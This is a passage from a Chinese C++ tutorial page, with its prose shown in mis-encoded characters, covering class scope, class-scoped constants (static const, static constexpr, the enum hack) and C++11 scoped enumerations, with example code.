<strong>é”™è¯¯:</strong> ä½¿ç”¨ <code>delete portfolio;</code> åªä¼šè°ƒç”¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ææ„å‡½æ•°ï¼Œå¹¶å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼æˆ–æœªå®šä¹‰è¡Œä¸ºã€‚</p></li></ul><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>  å¯ä»¥åƒåˆ›å»ºåŸºæœ¬ç±»å‹æ•°ç»„ä¸€æ ·åˆ›å»ºå¯¹è±¡æ•°ç»„ã€‚</li><li>  åˆ›å»ºå¯¹è±¡æ•°ç»„æ—¶ï¼Œä¼šä¸ºæ¯ä¸ªå…ƒç´ è°ƒç”¨æ„é€ å‡½æ•°ã€‚</li><li>  å¦‚æœæœªæä¾›æ˜¾å¼åˆå§‹åŒ–ï¼Œåˆ™è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ã€‚å› æ­¤ï¼Œå¯¹äºæœªåˆå§‹åŒ–çš„æ•°ç»„æˆ–ä½¿ç”¨ <code>new ClassName[size]</code> åˆ›å»ºçš„åŠ¨æ€æ•°ç»„ï¼Œç±»å¿…é¡»æœ‰å¯è®¿é—®çš„é»˜è®¤æ„é€ å‡½æ•°ã€‚</li><li>  å¯ä»¥ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ä¸ºæ•°ç»„æˆå‘˜æŒ‡å®šä¸åŒçš„æ„é€ å‡½æ•°ã€‚</li><li>  é€šè¿‡ <code>arrayName[index].member</code> çš„æ–¹å¼è®¿é—®æ•°ç»„æˆå‘˜ã€‚</li><li>  åŠ¨æ€å¯¹è±¡æ•°ç»„ä½¿ç”¨ <code>new ClassName[size]</code> åˆ›å»ºï¼Œå¹¶å¿…é¡»ä½¿ç”¨ <code>delete [] arrayPtr</code> é‡Šæ”¾ã€‚</li></ul><h2 id="10-6-ç±»ä½œç”¨åŸŸ"><a href="#10-6-ç±»ä½œç”¨åŸŸ" class="headerlink" title="10.6 ç±»ä½œç”¨åŸŸ"></a>10.6 ç±»ä½œç”¨åŸŸ</h2><p>æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨å‡½æ•°å†…éƒ¨æˆ–ä»£ç å—å†…éƒ¨å®šä¹‰çš„å˜é‡å…·æœ‰å±€éƒ¨ä½œç”¨åŸŸï¼ˆå—ä½œç”¨åŸŸï¼‰ã€‚ç±»ä¼¼åœ°ï¼Œåœ¨ç±»ä¸­å®šä¹‰çš„åç§°ï¼ˆæ•°æ®æˆå‘˜ã€æˆå‘˜å‡½æ•°ã€åµŒå¥—ç±»å‹ã€æšä¸¾ç­‰ï¼‰ä¹Ÿæœ‰å…¶ç‰¹å®šçš„ä½œç”¨åŸŸï¼Œç§°ä¸º**ç±»ä½œç”¨åŸŸ (Class Scope)**ã€‚</p><p><strong>ç±»ä½œç”¨åŸŸçš„è§„åˆ™:</strong></p><ol><li> <strong>å†…éƒ¨å¯è§æ€§:</strong> åœ¨ç±»å£°æ˜æˆ–æˆå‘˜å‡½æ•°å®šä¹‰å†…éƒ¨ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ç±»çš„æˆå‘˜ï¼ˆæ•°æ®æˆå‘˜ã€æˆå‘˜å‡½æ•°ã€æšä¸¾ç­‰ï¼‰ï¼Œæ— éœ€ç‰¹æ®Šé™å®šã€‚</li><li> <strong>å¤–éƒ¨è®¿é—®é™åˆ¶:</strong> åœ¨ç±»çš„å¤–éƒ¨ï¼Œä¸èƒ½ç›´æ¥è®¿é—®ç±»çš„æˆå‘˜ã€‚å¿…é¡»é€šè¿‡å¯¹è±¡ï¼ˆä½¿ç”¨ç‚¹å· <code>.</code> æˆ–ç®­å¤´ <code>-&gt;</code>ï¼‰æˆ–è€…é€šè¿‡ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code>ï¼ˆå¯¹äºé™æ€æˆå‘˜ã€åµŒå¥—ç±»å‹æˆ–æšä¸¾ï¼‰æ¥è®¿é—®ã€‚</li><li> <strong>åç§°éš”ç¦»:</strong> ç±»ä½œç”¨åŸŸæ„å‘³ç€åœ¨ä¸€ä¸ªç±»å†…éƒ¨å®šä¹‰çš„åç§°ä¸ä¼šä¸åœ¨å¦ä¸€ä¸ªç±»æˆ–å…¨å±€ä½œç”¨åŸŸä¸­å®šä¹‰çš„åŒååç§°å†²çªã€‚ä¾‹å¦‚ï¼Œä¸¤ä¸ªä¸åŒçš„ç±»å¯ä»¥éƒ½æœ‰ä¸€ä¸ªåä¸º <code>count</code> çš„æ•°æ®æˆå‘˜ã€‚</li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> count; <span class="comment">// ClassA çš„ count</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">()</span> </span>&#123; value = <span class="number">10</span>; &#125; <span class="comment">// å¯ä»¥ç›´æ¥è®¿é—® value</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> value; <span class="comment">// ClassA çš„ value</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">double</span> count; <span class="comment">// ClassB çš„ count (ä¸ ClassA::count ä¸å†²çª)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">calculate</span><span class="params">()</span> </span>&#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_count = <span class="number">100</span>; <span class="comment">// å…¨å±€å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ClassA objA;</span><br><span class="line">    ClassB objB;</span><br><span class="line"></span><br><span class="line">    objA.count = <span class="number">1</span>; <span class="comment">// è®¿é—® ClassA å¯¹è±¡çš„ count æˆå‘˜</span></span><br><span class="line">    objB.count = <span class="number">2.5</span>; <span class="comment">// è®¿é—® ClassB å¯¹è±¡çš„ count æˆå‘˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®ç±»å†…éƒ¨çš„åç§°</span></span><br><span class="line">    <span class="comment">// count = 5; // è®¿é—®å“ªä¸ª countï¼Ÿ </span></span><br><span class="line">    <span class="comment">// value = 20; // é”™è¯¯ï¼value åœ¨ç±»ä½œç”¨åŸŸå†…</span></span><br><span class="line"></span><br><span class="line">    objA.process(); <span class="comment">// é€šè¿‡å¯¹è±¡è°ƒç”¨æˆå‘˜å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code></strong></p><p>å½“æˆ‘ä»¬éœ€è¦åœ¨ç±»å¤–éƒ¨å¼•ç”¨ç±»ä½œç”¨åŸŸå†…çš„åç§°æ—¶ï¼ˆä¾‹å¦‚ï¼Œåœ¨å®šä¹‰æˆå‘˜å‡½æ•°æˆ–è®¿é—®é™æ€æˆå‘˜æ—¶ï¼‰ï¼Œå°±éœ€è¦ä½¿ç”¨ç±»åå’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ç±»å¤–éƒ¨å®šä¹‰æˆå‘˜å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClassA::process</span><span class="params">()</span> </span>&#123; <span class="comment">// ä½¿ç”¨ ClassA:: æŒ‡æ˜ process å±äº ClassA</span></span><br><span class="line">    value = <span class="number">10</span>; <span class="comment">// åœ¨æˆå‘˜å‡½æ•°å†…éƒ¨ï¼Œå¯ä»¥ç›´æ¥è®¿é—®å…¶ä»–æˆå‘˜</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;count = <span class="number">5</span>; <span class="comment">// ä¹Ÿå¯ä»¥æ˜¾å¼ä½¿ç”¨ this</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-6-1-ä½œç”¨åŸŸä¸ºç±»çš„å¸¸é‡"><a href="#10-6-1-ä½œç”¨åŸŸä¸ºç±»çš„å¸¸é‡" class="headerlink" title="10.6.1 ä½œç”¨åŸŸä¸ºç±»çš„å¸¸é‡"></a>10.6.1 ä½œç”¨åŸŸä¸ºç±»çš„å¸¸é‡</h3><p>æœ‰æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ªå¸¸é‡ï¼Œè¿™ä¸ªå¸¸é‡å¯¹äºè¯¥ç±»çš„æ‰€æœ‰å¯¹è±¡æ¥è¯´éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”å¯èƒ½åœ¨ç¼–è¯‘æ—¶å°±éœ€è¦çŸ¥é“å®ƒçš„å€¼ï¼ˆä¾‹å¦‚ï¼Œç”¨äºæŒ‡å®šæ•°ç»„å¤§å°ï¼‰ã€‚</p><p>æœ‰å‡ ç§æ–¹æ³•å¯ä»¥åœ¨ç±»ä½œç”¨åŸŸå†…åˆ›å»ºå¸¸é‡ï¼š</p><ol><li><p><strong><code>static const</code> æˆå‘˜ (æ•´å‹æˆ–æšä¸¾ç±»å‹ - C++11 å‰å¸¸ç”¨):</strong><br> å¯¹äºæ•´å‹ï¼ˆ<code>int</code>, <code>char</code>, <code>bool</code> ç­‰ï¼‰æˆ–æšä¸¾ç±»å‹çš„å¸¸é‡ï¼Œå¯ä»¥åœ¨ç±»å®šä¹‰å†…éƒ¨ä½¿ç”¨ <code>static const</code> ç›´æ¥åˆå§‹åŒ–ã€‚<code>static</code> æ„å‘³ç€è¿™ä¸ªå¸¸é‡å±äºç±»æœ¬èº«ï¼Œè€Œä¸æ˜¯ä»»ä½•ç‰¹å®šå¯¹è±¡ï¼ˆæ‰€æœ‰å¯¹è±¡å…±äº«åŒä¸€ä¸ªå¸¸é‡ï¼‰ï¼Œ<code>const</code> æ„å‘³ç€å®ƒçš„å€¼ä¸èƒ½è¢«ä¿®æ”¹ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bakery</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// è¿™ä¸ªå¸¸é‡å±äºç±»ï¼Œæ‰€æœ‰å¯¹è±¡å…±äº«</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> Months = <span class="number">12</span>; <span class="comment">// å£°æ˜å¹¶åˆå§‹åŒ–é™æ€å¸¸é‡æˆå‘˜</span></span><br><span class="line">    <span class="keyword">double</span> costs[Months];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„ï¼šå¦‚æœéœ€è¦åœ¨ç±»å¤–éƒ¨è·å–è¯¥å¸¸é‡çš„åœ°å€ï¼Œ</span></span><br><span class="line"><span class="comment">// æˆ–è€…ç¼–è¯‘å™¨è¦æ±‚ï¼ˆè¾ƒæ—§çš„ç¼–è¯‘å™¨å¯èƒ½éœ€è¦ï¼‰ï¼Œ</span></span><br><span class="line"><span class="comment">// å¯èƒ½è¿˜éœ€è¦åœ¨æºæ–‡ä»¶ä¸­æä¾›ä¸€ä¸ªå®šä¹‰ï¼ˆä¸å¸¦åˆå§‹å€¼ï¼‰ï¼š</span></span><br><span class="line"><span class="comment">// const int Bakery::Months; // å¯é€‰çš„å®šä¹‰</span></span><br></pre></td></tr></table></figure><p> è¿™ç§æ–¹å¼ä¸èƒ½ç”¨äºåˆå§‹åŒ–éæ•´å‹æˆ–éæšä¸¾ç±»å‹çš„é™æ€å¸¸é‡ã€‚</p></li><li><p><strong><code>static constexpr</code> æˆå‘˜ (C++11 åŠä»¥å):</strong><br> C++11 å¼•å…¥äº† <code>constexpr</code>ï¼Œå®ƒå…è®¸åœ¨ç¼–è¯‘æ—¶è®¡ç®—å¸¸é‡è¡¨è¾¾å¼ã€‚ä½¿ç”¨ <code>static constexpr</code> å¯ä»¥å®šä¹‰å„ç§ç±»å‹çš„ç±»ä½œç”¨åŸŸå¸¸é‡ï¼Œåªè¦åˆå§‹åŒ–è¡¨è¾¾å¼æ˜¯å¸¸é‡è¡¨è¾¾å¼å³å¯ã€‚è¿™æ˜¯ç°ä»£ C++ ä¸­å®šä¹‰ç±»å¸¸é‡çš„æ¨èæ–¹å¼ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">int</span> MaxUsers = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">double</span> Rate = <span class="number">1.5</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">const</span> <span class="keyword">char</span>* DefaultMsg = <span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> userLimit = Config::MaxUsers; <span class="comment">// ç›´æ¥ä½¿ç”¨ç±»åè®¿é—®</span></span><br><span class="line">    <span class="keyword">double</span> currentRate = Config::Rate;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>static constexpr</code> æˆå‘˜é»˜è®¤æ˜¯å†…è”çš„ï¼Œé€šå¸¸ä¸éœ€è¦åœ¨ç±»å¤–éƒ¨å†æ¬¡å®šä¹‰ã€‚</p></li><li><p><strong>æšä¸¾æŠ€å·§ (Enum Hack - C++11 å‰çš„å˜é€šæ–¹æ³•):</strong><br> åœ¨ C++11 ä¹‹å‰ï¼Œå¦‚æœæƒ³åœ¨ç±»ä¸­å®šä¹‰ä¸€ä¸ªéæ•´å‹çš„å¸¸é‡ï¼ˆæˆ–è€…åªæ˜¯æƒ³é¿å… <code>static const</code> å¯èƒ½éœ€è¦çš„å¤–éƒ¨å®šä¹‰ï¼‰ï¼Œæœ‰æ—¶ä¼šä½¿ç”¨åŒ¿åæšä¸¾ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LegacyBox</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> MaxSize = <span class="number">100</span> &#125;; <span class="comment">// æšä¸¾æŠ€å·§</span></span><br><span class="line">    <span class="keyword">int</span> items[MaxSize]; <span class="comment">// ä½¿ç”¨æšä¸¾é‡ä½œä¸ºæ•°ç»„å¤§å°</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p> <code>MaxSize</code> å°±åƒä¸€ä¸ªå€¼ä¸º 100 çš„æ•´å‹å¸¸é‡ï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªæšä¸¾é‡ã€‚è¿™ç§æ–¹æ³•ç°åœ¨å·²ä¸å¸¸ç”¨ï¼Œ<code>static constexpr</code> æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚</p></li></ol><h3 id="10-6-2-ä½œç”¨åŸŸå†…æšä¸¾-Scoped-Enumerations-C-11"><a href="#10-6-2-ä½œç”¨åŸŸå†…æšä¸¾-Scoped-Enumerations-C-11" class="headerlink" title="10.6.2 ä½œç”¨åŸŸå†…æšä¸¾ (Scoped Enumerations - C++11)"></a>10.6.2 ä½œç”¨åŸŸå†…æšä¸¾ (Scoped Enumerations - C++11)</h3><p>ä¼ ç»Ÿçš„ C++ æšä¸¾ï¼ˆ<code>enum</code>ï¼‰å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š</p><ul><li>  <strong>åç§°å†²çª:</strong> æšä¸¾é‡ï¼ˆenumeratorsï¼‰è¢«æ”¾ç½®åœ¨ä¸æšä¸¾å®šä¹‰ç›¸åŒçš„ä½œç”¨åŸŸä¸­ï¼Œå®¹æ˜“ä¸å…¶ä»–åç§°ï¼ˆåŒ…æ‹¬å…¶ä»–æšä¸¾çš„æšä¸¾é‡ï¼‰å‘ç”Ÿå†²çªã€‚</li><li>  <strong>éšå¼è½¬æ¢:</strong> æšä¸¾é‡å¯ä»¥éšå¼åœ°è½¬æ¢ä¸ºæ•´å‹ï¼Œæœ‰æ—¶è¿™å¯èƒ½å¯¼è‡´é€»è¾‘é”™è¯¯æˆ–é™ä½ç±»å‹å®‰å…¨æ€§ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OldColor</span> &#123;</span> RED, GREEN, BLUE &#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">StopLight</span> &#123;</span> RED, YELLOW, GREEN &#125;; <span class="comment">// é”™è¯¯ï¼RED å’Œ GREEN é‡å®šä¹‰</span></span><br><span class="line"></span><br><span class="line">OldColor myColor = RED; <span class="comment">// OK</span></span><br><span class="line"><span class="keyword">int</span> colorValue = myColor; <span class="comment">// OK, éšå¼è½¬æ¢ä¸º int (å€¼ä¸º 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (myColor == <span class="number">0</span>) &#123; <span class="comment">/* ... */</span> &#125; <span class="comment">// å¯ä»¥å’Œæ•´æ•°æ¯”è¾ƒ</span></span><br></pre></td></tr></table></figure><p>ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼ŒC++11 å¼•å…¥äº†**ä½œç”¨åŸŸå†…æšä¸¾ (Scoped Enumerations)**ï¼Œä½¿ç”¨ <code>enum class</code> æˆ– <code>enum struct</code> å…³é”®å­—å®šä¹‰ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ol><li> <strong>ä½œç”¨åŸŸé™åˆ¶:</strong> æšä¸¾é‡çš„ä½œç”¨åŸŸè¢«é™åˆ¶åœ¨æšä¸¾æœ¬èº«å†…éƒ¨ã€‚è®¿é—®æšä¸¾é‡å¿…é¡»ä½¿ç”¨æšä¸¾åç§°å’Œä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code>ã€‚</li><li> <strong>æ— éšå¼è½¬æ¢:</strong> ä½œç”¨åŸŸå†…æšä¸¾ç±»å‹ä¸èƒ½éšå¼åœ°è½¬æ¢ä¸ºæ•´å‹æˆ–å…¶ä»–ç±»å‹ã€‚å¦‚æœéœ€è¦è½¬æ¢ï¼Œå¿…é¡»ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢ï¼ˆå¦‚ <code>static_cast</code>ï¼‰ã€‚</li><li> <strong>ç±»å‹å®‰å…¨:</strong> å¢å¼ºäº†ç±»å‹å®‰å…¨æ€§ï¼Œä¸åŒä½œç”¨åŸŸæšä¸¾ç±»å‹çš„å€¼ä¸èƒ½ç›´æ¥æ¯”è¾ƒï¼ˆé™¤éé‡è½½äº†æ¯”è¾ƒè¿ç®—ç¬¦ï¼‰ã€‚</li><li> <strong>å¯æŒ‡å®šåº•å±‚ç±»å‹:</strong> å¯ä»¥æ˜¾å¼æŒ‡å®šæšä¸¾ä½¿ç”¨çš„åº•å±‚æ•´æ•°ç±»å‹ï¼ˆé»˜è®¤ä¸º <code>int</code>ï¼‰ã€‚</li></ol><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">EnumName</span> :</span> UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;</span><br><span class="line"><span class="comment">// æˆ–è€… enum struct (åŠŸèƒ½ç›¸åŒ)</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">struct</span> <span class="title">EnumName</span> :</span> UnderlyingType &#123; Enumerator1, Enumerator2, ... &#125;;</span><br><span class="line"><span class="comment">// : UnderlyingType æ˜¯å¯é€‰çš„</span></span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ enum class å®šä¹‰ä½œç”¨åŸŸå†…æšä¸¾</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Color</span> :</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> &#123; <span class="comment">// æŒ‡å®šåº•å±‚ç±»å‹ä¸º unsigned char</span></span><br><span class="line">    RED,    <span class="comment">// Color::RED</span></span><br><span class="line">    GREEN,  <span class="comment">// Color::GREEN</span></span><br><span class="line">    BLUE    <span class="comment">// Color::BLUE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">TrafficLight</span> &#123;</span></span><br><span class="line">    RED,    <span class="comment">// TrafficLight::RED (ä¸ Color::RED ä¸å†²çª)</span></span><br><span class="line">    YELLOW,</span><br><span class="line">    GREEN</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color myColor = Color::RED; <span class="comment">// å¿…é¡»ä½¿ç”¨ä½œç”¨åŸŸè§£æç¬¦</span></span><br><span class="line">    TrafficLight light = TrafficLight::GREEN;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ï¼æšä¸¾é‡ä¸åœ¨å½“å‰ä½œç”¨åŸŸ</span></span><br><span class="line">    <span class="comment">// Color anotherColor = RED;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ï¼ä¸èƒ½éšå¼è½¬æ¢ä¸º int</span></span><br><span class="line">    <span class="comment">// int colorCode = myColor;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éœ€è¦æ˜¾å¼è½¬æ¢</span></span><br><span class="line">    <span class="keyword">int</span> colorCode = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(myColor);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> underlyingValue = <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">char</span>&gt;(myColor);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Color code: &quot;</span> &lt;&lt; colorCode &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Underlying value: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(underlyingValue) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0 (éœ€è¦å†æ¬¡è½¬æ¢æ‰èƒ½æ‰“å°ä¸ºæ•°å­—)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯ï¼ä¸åŒæšä¸¾ç±»å‹ä¸èƒ½ç›´æ¥æ¯”è¾ƒ</span></span><br><span class="line">    <span class="comment">// if (myColor == light) &#123; /* ... */ &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥ä¸ç›¸åŒç±»å‹çš„æšä¸¾é‡æ¯”è¾ƒ</span></span><br><span class="line">    <span class="keyword">if</span> (myColor == Color::RED) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is red.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (light == TrafficLight::GREEN) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The light is green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½œç”¨åŸŸå†…æšä¸¾æ˜¯ç°ä»£ C++ ä¸­å®šä¹‰æšä¸¾ç±»å‹çš„é¦–é€‰æ–¹å¼ï¼Œå› ä¸ºå®ƒæ›´å®‰å…¨ã€æ›´ä¸å®¹æ˜“å‡ºé”™ï¼Œå¹¶ä¸”é¿å…äº†åç§°æ±¡æŸ“ã€‚</p><h3 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>  ç±»æˆå‘˜ï¼ˆæ•°æ®ã€å‡½æ•°ã€ç±»å‹ã€å¸¸é‡ã€æšä¸¾ï¼‰å…·æœ‰<strong>ç±»ä½œç”¨åŸŸ</strong>ã€‚</li><li>  åœ¨ç±»å¤–éƒ¨è®¿é—®ç±»æˆå‘˜éœ€è¦é€šè¿‡å¯¹è±¡ï¼ˆ<code>.</code> æˆ– <code>-&gt;</code>ï¼‰æˆ–ç±»åï¼ˆ<code>::</code>ï¼‰ã€‚</li><li>  ç±»ä½œç”¨åŸŸå¯ä»¥éš”ç¦»åç§°ï¼Œé˜²æ­¢ä¸å…¨å±€æˆ–å…¶ä»–ç±»ä¸­çš„åç§°å†²çªã€‚</li><li>  å¯ä»¥ä½¿ç”¨ <code>static 